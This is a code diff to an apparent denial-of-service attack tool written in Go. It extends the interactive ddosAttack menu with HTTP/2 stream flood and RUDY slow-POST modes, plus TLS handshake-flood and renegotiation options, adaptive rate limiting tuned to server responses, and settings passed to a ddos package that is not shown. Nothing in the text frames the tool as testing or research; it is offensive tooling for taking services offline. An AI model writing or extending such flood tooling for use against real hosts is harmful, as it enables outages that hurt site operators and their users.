@@ -448,10 +448,12 @@ func (m *Menu) ddosAttack() {
 
 	// Attack Mode
 	fmt.Println("\nSelect Attack Mode:")
-	fmt.Println("  [1] HTTP Flood     - Maximum concurrent HTTP requests (Default)")
-	fmt.Println("  [2] Slowloris      - Hold connections open with partial headers")
-	fmt.Println("  [3] Mixed          - Combination of flood (70%) and slowloris (30%)")
-	fmt.Print("Enter choice (1-3, default: 1): ")
+	fmt.Println("  [1] HTTP Flood          - Maximum concurrent HTTP requests (Default)")
+	fmt.Println("  [2] Slowloris           - Hold connections open with partial headers")
+	fmt.Println("  [3] Mixed               - Combination of flood (70%) and slowloris (30%)")
+	fmt.Println("  [4] HTTP/2 Stream Flood - Flood with HTTP/2 streams (HTTPS only)")
+	fmt.Println("  [5] RUDY                - Slow HTTP POST attack (R-U-Dead-Yet)")
+	fmt.Print("Enter choice (1-5, default: 1): ")
 	modeChoice, _ := reader.ReadString('\n')
 	modeChoice = strings.TrimSpace(modeChoice)
 
@@ -463,9 +465,107 @@ func (m *Menu) ddosAttack() {
 	case "3":
 		attackMode = ddos.ModeMixed
 		fmt.Println("✓ Mixed mode selected (70% flood, 30% slowloris)")
+	case "4":
+		attackMode = ddos.ModeHTTP2StreamFlood
+		fmt.Println("✓ HTTP/2 Stream Flood mode selected")
+	case "5":
+		attackMode = ddos.ModeRUDY
+		fmt.Println("✓ RUDY (Slow HTTP POST) mode selected")
 	default:
 		attackMode = ddos.ModeFlood
 		fmt.Println("✓ HTTP Flood mode selected")
+	}
+
+	// TLS Attack Configuration
+	fmt.Println("\n===== TLS Attack Configuration =====")
+	fmt.Print("Enable TLS attack combinations? (y/n, default: n): ")
+	useTLSAttackStr, _ := reader.ReadString('\n')
+	useTLSAttackStr = strings.TrimSpace(strings.ToLower(useTLSAttackStr))
+	useTLSAttack := useTLSAttackStr == "y" || useTLSAttackStr == "yes"
+
+	var forceTLS, tlsHandshakeFlood, tlsRenegotiation bool
+	var tlsMinVersion, tlsMaxVersion uint16
+	var tlsCipherSuites []uint16
+
+	if useTLSAttack {
+		fmt.Println("✓ TLS attack combinations enabled")
+		fmt.Println("\nTLS Attack Options:")
+
+		// Force TLS on HTTP URLs
+		fmt.Print("Force TLS on HTTP URLs? (y/n, default: n): ")
+		forceTLSStr, _ := reader.ReadString('\n')
+		forceTLSStr = strings.TrimSpace(strings.ToLower(forceTLSStr))
+		forceTLS = forceTLSStr == "y" || forceTLSStr == "yes"
+		if forceTLS {
+			fmt.Println("✓ Force TLS enabled - HTTP URLs will use TLS")
+		}
+
+		// TLS Handshake Flood
+		fmt.Print("Enable TLS Handshake Flood? (y/n, default: n): ")
+		handshakeFloodStr, _ := reader.ReadString('\n')
+		handshakeFloodStr = strings.TrimSpace(strings.ToLower(handshakeFloodStr))
+		tlsHandshakeFlood = handshakeFloodStr == "y" || handshakeFloodStr == "yes"
+		if tlsHandshakeFlood {
+			fmt.Println("✓ TLS Handshake Flood enabled - Will initiate many TLS handshakes")
+		}
+
+		// TLS Renegotiation
+		fmt.Print("Enable TLS Renegotiation attacks? (y/n, default: n): ")
+		renegotiationStr, _ := reader.ReadString('\n')
+		renegotiationStr = strings.TrimSpace(strings.ToLower(renegotiationStr))
+		tlsRenegotiation = renegotiationStr == "y" || renegotiationStr == "yes"
+		if tlsRenegotiation {
+			fmt.Println("✓ TLS Renegotiation enabled - Will force renegotiation on connections")
+		}
+
+		// TLS Version configuration (optional)
+		fmt.Print("\nConfigure TLS version? (y/n, default: n): ")
+		configTLSVersionStr, _ := reader.ReadString('\n')
+		configTLSVersionStr = strings.TrimSpace(strings.ToLower(configTLSVersionStr))
+		if configTLSVersionStr == "y" || configTLSVersionStr == "yes" {
+			fmt.Println("TLS Versions:")
+			fmt.Println("  1) TLS 1.0")
+			fmt.Println("  2) TLS 1.1")
+			fmt.Println("  3) TLS 1.2")
+			fmt.Println("  4) TLS 1.3")
+			fmt.Print("Enter minimum TLS version (1-4, or Enter for default): ")
+			minVerStr, _ := reader.ReadString('\n')
+			minVerStr = strings.TrimSpace(minVerStr)
+			if minVerStr != "" {
+				if ver, err := strconv.Atoi(minVerStr); err == nil {
+					switch ver {
+					case 1:
+						tlsMinVersion = 0x0301 // tls.VersionTLS10
+					case 2:
+						tlsMinVersion = 0x0302 // tls.VersionTLS11
+					case 3:
+						tlsMinVersion = 0x0303 // tls.VersionTLS12
+					case 4:
+						tlsMinVersion = 0x0304 // tls.VersionTLS13
+					}
+				}
+			}
+
+			fmt.Print("Enter maximum TLS version (1-4, or Enter for default): ")
+			maxVerStr, _ := reader.ReadString('\n')
+			maxVerStr = strings.TrimSpace(maxVerStr)
+			if maxVerStr != "" {
+				if ver, err := strconv.Atoi(maxVerStr); err == nil {
+					switch ver {
+					case 1:
+						tlsMaxVersion = 0x0301 // tls.VersionTLS10
+					case 2:
+						tlsMaxVersion = 0x0302 // tls.VersionTLS11
+					case 3:
+						tlsMaxVersion = 0x0303 // tls.VersionTLS12
+					case 4:
+						tlsMaxVersion = 0x0304 // tls.VersionTLS13
+					}
+				}
+			}
+		}
+	} else {
+		fmt.Println("✓ TLS attack combinations disabled")
 	}
 
 	// Number of threads
@@ -519,6 +619,71 @@ func (m *Menu) ddosAttack() {
 	reuseStr = strings.TrimSpace(strings.ToLower(reuseStr))
 	reuseConnections := reuseStr != "n" && reuseStr != "no"
 
+	// HTTP/2 Support (for flood mode)
+	var useHTTP2 bool
+	if attackMode == ddos.ModeFlood || attackMode == ddos.ModeMixed {
+		fmt.Print("Enable HTTP/2 support? (y/n, default: n): ")
+		http2Str, _ := reader.ReadString('\n')
+		http2Str = strings.TrimSpace(strings.ToLower(http2Str))
+		useHTTP2 = http2Str == "y" || http2Str == "yes"
+		if useHTTP2 {
+			fmt.Println("✓ HTTP/2 support enabled (requires HTTPS)")
+		}
+	}
+
+	// Adaptive Rate Limiting
+	var adaptiveRateLimit bool
+	if rateLimit > 0 {
+		fmt.Print("Use adaptive rate limiting? (y/n, default: n): ")
+		adaptiveStr, _ := reader.ReadString('\n')
+		adaptiveStr = strings.TrimSpace(strings.ToLower(adaptiveStr))
+		adaptiveRateLimit = adaptiveStr == "y" || adaptiveStr == "yes"
+		if adaptiveRateLimit {
+			fmt.Println("✓ Adaptive rate limiting enabled - will adjust rate based on server response")
+		}
+	}
+
+	// RUDY specific settings
+	var rudyDelay time.Duration
+	var rudyBodySize int
+	if attackMode == ddos.ModeRUDY {
+		fmt.Print("Enter RUDY delay between bytes in seconds (default: 10): ")
+		rudyDelayStr, _ := reader.ReadString('\n')
+		rudyDelayStr = strings.TrimSpace(rudyDelayStr)
+		rudyDelay = 10 * time.Second
+		if rudyDelayStr != "" {
+			if d, err := strconv.Atoi(rudyDelayStr); err == nil && d > 0 {
+				rudyDelay = time.Duration(d) * time.Second
+			}
+		}
+
+		fmt.Print("Enter RUDY POST body size in bytes (default: 1048576 = 1MB): ")
+		rudySizeStr, _ := reader.ReadString('\n')
+		rudySizeStr = strings.TrimSpace(rudySizeStr)
+		rudyBodySize = 1024 * 1024 // 1MB
+		if rudySizeStr != "" {
+			if s, err := strconv.Atoi(rudySizeStr); err == nil && s > 0 {
+				rudyBodySize = s
+			}
+		}
+		fmt.Printf("✓ RUDY configured: %d bytes, %s delay\n", rudyBodySize, rudyDelay)
+	}
+
+	// HTTP/2 Stream Flood settings
+	var maxStreamsPerConn int
+	if attackMode == ddos.ModeHTTP2StreamFlood {
+		fmt.Print("Enter max streams per connection (default: 100): ")
+		streamsStr, _ := reader.ReadString('\n')
+		streamsStr = strings.TrimSpace(streamsStr)
+		maxStreamsPerConn = 100
+		if streamsStr != "" {
+			if s, err := strconv.Atoi(streamsStr); err == nil && s > 0 {
+				maxStreamsPerConn = s
+			}
+		}
+		fmt.Printf("✓ Max streams per connection: %d\n", maxStreamsPerConn)
+	}
+
 	// Timeout
 	fmt.Print("Enter request timeout in seconds (default: 5): ")
 	timeoutStr, _ := reader.ReadString('\n')
@@ -547,6 +712,20 @@ func (m *Menu) ddosAttack() {
 		if useCustomUserAgents {
 			config.UserAgentFilePath = "user-agent.txt"
 		}
+		// Apply TLS attack settings
+		config.UseTLSAttack = useTLSAttack
+		config.ForceTLS = forceTLS
+		config.TLSHandshakeFlood = tlsHandshakeFlood
+		config.TLSRenegotiation = tlsRenegotiation
+		config.TLSMinVersion = tlsMinVersion
+		config.TLSMaxVersion = tlsMaxVersion
+		config.TLSCipherSuites = tlsCipherSuites
+		// Apply HTTP/2 and advanced settings
+		config.UseHTTP2 = useHTTP2
+		config.AdaptiveRateLimit = adaptiveRateLimit
+		config.RUDYDelay = rudyDelay
+		config.RUDYBodySize = rudyBodySize
+		config.MaxStreamsPerConn = maxStreamsPerConn
 	}
 
 	// Summary before starting
@@ -573,6 +752,35 @@ func (m *Menu) ddosAttack() {
 		fmt.Printf("Proxy:             Enabled (%d proxies, rotation: %v)\n", len(proxyList), rotateProxy)
 	} else {
 		fmt.Printf("Proxy:             Disabled\n")
+	}
+	if useTLSAttack {
+		fmt.Printf("TLS Attacks:       Enabled\n")
+		if forceTLS {
+			fmt.Printf("  - Force TLS:     Enabled\n")
+		}
+		if tlsHandshakeFlood {
+			fmt.Printf("  - Handshake Flood: Enabled\n")
+		}
+		if tlsRenegotiation {
+			fmt.Printf("  - Renegotiation:  Enabled\n")
+		}
+		if tlsMinVersion > 0 || tlsMaxVersion > 0 {
+			fmt.Printf("  - TLS Versions:   Min=%d, Max=%d\n", tlsMinVersion, tlsMaxVersion)
+		}
+	} else {
+		fmt.Printf("TLS Attacks:       Disabled\n")
+	}
+	if useHTTP2 {
+		fmt.Printf("HTTP/2 Support:    Enabled\n")
+	}
+	if adaptiveRateLimit {
+		fmt.Printf("Adaptive Rate:     Enabled\n")
+	}
+	if attackMode == ddos.ModeRUDY {
+		fmt.Printf("RUDY Config:       %d bytes, %s delay\n", rudyBodySize, rudyDelay)
+	}
+	if attackMode == ddos.ModeHTTP2StreamFlood {
+		fmt.Printf("Max Streams/Conn:   %d\n", maxStreamsPerConn)
 	}
 	fmt.Println(strings.Repeat("=", 70))
 
